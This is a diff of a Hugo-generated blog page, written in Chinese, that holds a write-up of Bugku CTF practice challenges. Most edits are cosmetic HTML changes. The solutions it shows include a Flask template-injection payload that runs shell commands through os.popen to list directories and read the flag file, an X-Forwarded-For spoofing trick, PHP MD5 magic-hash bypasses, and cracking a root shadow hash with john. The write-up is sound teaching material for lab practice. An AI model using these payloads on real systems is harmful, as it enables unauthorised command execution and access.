@@ -34,7 +34,7 @@ Web5  Des:矛盾。
 <link rel=mask-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
 <meta name=theme-color content="#2e2e33">
 <meta name=msapplication-TileColor content="#2e2e33">
-<meta name=generator content="Hugo 0.87.0">
+<meta name=generator content="Hugo 0.88.1">
 <meta property="og:title" content="Bugku">
 <meta property="og:description" content="Bugku Web Web1  Des：flag{}。
  查看源码即可。
@@ -306,7 +306,7 @@ April 13, 2020&nbsp;·&nbsp;12 min&nbsp;·&nbsp;DaChui
 <p>Des：flag{}。</p>
 </blockquote>
 <p>通过get传参，按照题目要求直接传入</p>
-<pre><code>?what=flag
+<pre tabindex=0><code>?what=flag
 </code></pre><h3 id=web4>Web4<a hidden class=anchor aria-hidden=true href=#web4>#</a></h3>
 <blockquote>
 <p>Des:post。</p>
@@ -351,7 +351,7 @@ print(r<span style=color:#f92672>.</span>text)
         <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;flag{********}&#39;</span>;
 }
 </code></pre></div><p>利用<code>1a</code>绕过，例：</p>
-<pre><code>?num=1a01
+<pre tabindex=0><code>?num=1a01
 </code></pre><h3 id=web6>Web6<a hidden class=anchor aria-hidden=true href=#web6>#</a></h3>
 <blockquote>
 <p>Des:flag{}。</p>
@@ -397,7 +397,7 @@ print(r<span style=color:#f92672>.</span>text)
 <p>Des:N/A。</p>
 </blockquote>
 <p>页面显示：</p>
-<pre><code>You need pass in a parameter named flag。
+<pre tabindex=0><code>You need pass in a parameter named flag。
 </code></pre><p>查看源码：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=color:#75715e>&lt;!DOCTYPE html&gt;</span>
 &lt;<span style=color:#f92672>html</span> <span style=color:#a6e22e>lang</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span>&gt;
@@ -411,7 +411,7 @@ You need pass in a parameter named flag。
 &lt;/<span style=color:#f92672>body</span>&gt;
 &lt;/<span style=color:#f92672>html</span>&gt;
 </code></pre></div><p>搜了一下，<code>SECRET_KEY</code>是<code>Flask</code>中一个比较重要的变量值。</p>
-<pre><code>?flag=flag
+<pre tabindex=0><code>?flag=flag
 # 页面回显flag
 ?flag=2*2
 # 回显4，说明我们传入的数据是被信任的，存在ssti
@@ -436,15 +436,15 @@ You need pass in a parameter named flag
 &lt;/<span style=color:#f92672>body</span>&gt;
 &lt;/<span style=color:#f92672>html</span>&gt;
 </code></pre></div><p>查看根目录：</p>
-<pre><code>?flag={{config.__class__.__init__.__globals__['os'].popen('ls ..').read()}}
+<pre tabindex=0><code>?flag={{config.__class__.__init__.__globals__['os'].popen('ls ..').read()}}
 </code></pre><p>执行结果：</p>
-<pre><code>app bin dev etc home lib media mnt opt proc root run sbin srv sys tmp usr var
+<pre tabindex=0><code>app bin dev etc home lib media mnt opt proc root run sbin srv sys tmp usr var
 </code></pre><p>我们挨个查看目录，从第一个开始：</p>
-<pre><code>?flag={{config.__class__.__init__.__globals__['os'].popen('ls ../app/').read()}}
+<pre tabindex=0><code>?flag={{config.__class__.__init__.__globals__['os'].popen('ls ../app/').read()}}
 </code></pre><p>执行结果：</p>
-<pre><code>Dockerfile app.py flag gunicorn.conf.py templates
+<pre tabindex=0><code>Dockerfile app.py flag gunicorn.conf.py templates
 </code></pre><p>直接查看<code>flag</code>文件：</p>
-<pre><code>?flag={{config.__class__.__init__.__globals__['os'].popen('cat ../app/flag').read()}}
+<pre tabindex=0><code>?flag={{config.__class__.__init__.__globals__['os'].popen('cat ../app/flag').read()}}
 </code></pre><p>获得<code>flag</code>。</p>
 <h3 id=web10>Web10<a hidden class=anchor aria-hidden=true href=#web10>#</a></h3>
 <blockquote>
@@ -544,9 +544,9 @@ You need pass in a parameter named flag
 <p>Des:N/A。</p>
 </blockquote>
 <p>是一个登录窗口，查看控制台元素：</p>
-<pre><code>&lt;!-- dGVzdDEyMw== --&gt;
+<pre tabindex=0><code>&lt;!-- dGVzdDEyMw== --&gt;
 </code></pre><p>这是<code>Base64</code>编码，解码获得：</p>
-<pre><code>&lt;!-- test123 --&gt;
+<pre tabindex=0><code>&lt;!-- test123 --&gt;
 </code></pre><p>尝试账密<code>admin/test123</code>。</p>
 <p>页面报错，显示<code>IP</code>禁止访问，猜测应该是对访问地址进行了限制，尝试利用<code>X-Forwarde-For</code>修改<code>XFF</code>头为<code>127.0.0.1</code>。</p>
 <blockquote>
@@ -568,7 +568,7 @@ You need pass in a parameter named flag
 <p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311172639877.png alt=image-20210311172639877>
 </p>
 <p>进行<code>Base64</code>解码：</p>
-<pre><code class=language-php+HTML data-lang=php+HTML>&lt;html&gt;
+<pre tabindex=0><code class=language-php+HTML data-lang=php+HTML>&lt;html&gt;
     &lt;title&gt;Bugku-ctf&lt;/title&gt;
 &lt;?php
 	error_reporting(0);
@@ -607,10 +607,10 @@ You need pass in a parameter named flag
 <p>Des:听说备份是个好习惯。</p>
 </blockquote>
 <p>得到一串编码字符串：</p>
-<pre><code>d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e
+<pre tabindex=0><code>d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e
 </code></pre><p>不晓得这是什么&mldr;然后用御剑扫描后台，发现<code>index.php.bak</code>备份文件，下载使用<code>cat</code>命令查看。</p>
 <p>简单判断，需要进行<code>md5碰撞</code>获得<code>flag</code>，而且后台会自动替换掉<code>key</code>关键字，首先查找常见<code>md5碰撞值</code>，然后通过复写<code>key</code>关键字进行绕过：</p>
-<pre><code>?kkeyey1=QNKCDZO&amp;&amp;kkeyey2=s878926199a
+<pre tabindex=0><code>?kkeyey1=QNKCDZO&amp;&amp;kkeyey2=s878926199a
 </code></pre><p>将构造字符串置于<code>URL</code>最后，回车访问。</p>
 <p>获得<code>flag</code>。</p>
 <h3 id=成绩单>成绩单<a hidden class=anchor aria-hidden=true href=#成绩单>#</a></h3>
@@ -743,7 +743,7 @@ never never never give up!!!
 <p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311173343036.png alt=image-20210311173343036>
 </p>
 <p>Base64解码：</p>
-<pre><code>!--%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E--
+<pre tabindex=0><code>!--%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E--
 </code></pre><p>URL解码：</p>
 <p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311173428719.png alt=image-20210311173428719>
 </p>
@@ -944,7 +944,7 @@ never never never give up!!!
 </blockquote>
 <p>御剑扫描后台，没有有效信息。</p>
 <p>根据提示，<code>GET</code>传参<code>?hint=0</code>，获得代码：</p>
-<pre><code class=language-php+HTML data-lang=php+HTML>&lt;?php
+<pre tabindex=0><code class=language-php+HTML data-lang=php+HTML>&lt;?php
 error_reporting(0);
 include_once(&quot;flag.php&quot;);
 $cookie = $_COOKIE['ISecer']; // cookie = 'ISecer'
@@ -1226,7 +1226,7 @@ Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.</p>
 </code></pre></div><p><code>HTML</code>解码。</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#37;&amp;#55;&amp;#66;&amp;#99;&amp;#116;&amp;#102;&amp;#95;&amp;#116;&amp;#102;&amp;#99;&amp;#50;&amp;#48;&amp;#49;&amp;#55;&amp;#49;&amp;#55;&amp;#113;&amp;#119;&amp;#101;&amp;#37;&amp;#55;&amp;#68;
 </code></pre></div><p><code>HTML</code>解码。</p>
-<pre><code>flag%7Bctf_tfc201717qwe%7D
+<pre tabindex=0><code>flag%7Bctf_tfc201717qwe%7D
 </code></pre><p>改为正常的<code>flag</code>格式。</p>
 <h3 id=heading>.!?<a hidden class=anchor aria-hidden=true href=#heading>#</a></h3>
 <blockquote>
@@ -1240,7 +1240,7 @@ Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.</p>
 <blockquote>
 <p>Des:N/A。</p>
 </blockquote>
-<pre><code>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;
+<pre tabindex=0><code>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;
 ++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ [-&gt;-- ---&lt;] &gt;.&lt;++ ++[-&gt; ++++&lt; ]&gt;+++ .&lt;+++
 [-&gt;-- -&lt;]&gt;- ----. ++++. &lt;+++[ -&gt;+++ &lt;]&gt;+. &lt;++++ [-&gt;-- --&lt;]&gt; ----- -.&lt;++
 +[-&gt;+ ++&lt;]&gt; ++.-. ----- ---.&lt; +++[- &gt;+++&lt; ]&gt;+++ .---- .&lt;+++ [-&gt;-- -&lt;]&gt;-
@@ -1285,7 +1285,7 @@ print(flag)
 </blockquote>
 <p>题目给了一个压缩包，打开里面的<code>flag.txt</code>文档需要密码，当然这里说了伪加密。</p>
 <p>先来分析一下ZIP文件的三个组成部分：</p>
-<pre><code>压缩源文件数据区：
+<pre tabindex=0><code>压缩源文件数据区：
 50 4B 03 04：这是头文件标记（0x04034b50）
 14 00：解压文件所需 pkware 版本
 00 00：全局方式位标记（有N/A加密）
@@ -1335,11 +1335,11 @@ F7 46：最后修改文件日期
 </blockquote>
 <p>数字范围<code>0-9</code>，字母范围<code>A-E</code>。</p>
 <p>十六进制转字符串。</p>
-<pre><code>cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g
+<pre tabindex=0><code>cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g
 </code></pre><p><code>Base64</code>转字符串。</p>
-<pre><code>r5yG lp9I BjM tFhB T6uh y7iJ QsZ bhM
+<pre tabindex=0><code>r5yG lp9I BjM tFhB T6uh y7iJ QsZ bhM
 </code></pre><p>这个东西，看看键盘，刚好把中间的键给围了起来。</p>
-<pre><code>TONGYUAN
+<pre tabindex=0><code>TONGYUAN
 </code></pre><p>获得<code>flag</code>。</p>
 <h3 id=这不是md5>这不是md5<a hidden class=anchor aria-hidden=true href=#这不是md5>#</a></h3>
 <blockquote>
@@ -1374,7 +1374,7 @@ F7 46：最后修改文件日期
 <blockquote>
 <p>Des:二进制、八进制、十进制、十六进制，你能分的清吗？</p>
 </blockquote>
-<pre><code>d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e
+<pre tabindex=0><code>d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e
 </code></pre><p>思路：先把所有数据转换为统一的形式，再转换为字符串。这里转为十六进制。</p>
 <p><img loading=lazy src=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/image-20210311174250846.png alt=image-20210311174250846>
 </p>
@@ -1403,7 +1403,7 @@ print(flag)
 <p>Des:破解该文件，获得密码。</p>
 </blockquote>
 <p>给了一个<code>shadow</code>文件，记事本打开看看，内容：</p>
-<pre><code>root:$6$HRMJoyGA$26FIgg6CU0bGUOfqFB0Qo9AE2LRZxG8N3H.3BK8t49wGlYbkFbxVFtGOZqVIq3qQ6k0oetDbn2aVzdhuVQ6US.:17770:0:99999:7:::
+<pre tabindex=0><code>root:$6$HRMJoyGA$26FIgg6CU0bGUOfqFB0Qo9AE2LRZxG8N3H.3BK8t49wGlYbkFbxVFtGOZqVIq3qQ6k0oetDbn2aVzdhuVQ6US.:17770:0:99999:7:::
 </code></pre><p>这个需要应该是破解用户密码，使用<code>kali</code>的<code>john</code>工具，命令：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>john shadow
 </code></pre></div><p>结果：</p>
@@ -1415,7 +1415,7 @@ print(flag)
 <blockquote>
 <p>Des:N/A。</p>
 </blockquote>
-<pre><code>N : 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597
+<pre tabindex=0><code>N : 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597
 
 e : 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619
 
@@ -1427,7 +1427,7 @@ enc : 38230991316229399651823567590692301060044620412191737764632384680546256228
 </blockquote>
 <p>搜索标准银河字母，找到对应表。</p>
 <p>对应下来就是：</p>
-<pre><code>nopqrst
+<pre tabindex=0><code>nopqrst
 </code></pre><p>获得<code>flag</code>。</p>
 <h2 id=reverse>Reverse<a hidden class=anchor aria-hidden=true href=#reverse>#</a></h2>
 <h3 id=入门逆向>入门逆向<a hidden class=anchor aria-hidden=true href=#入门逆向>#</a></h3>
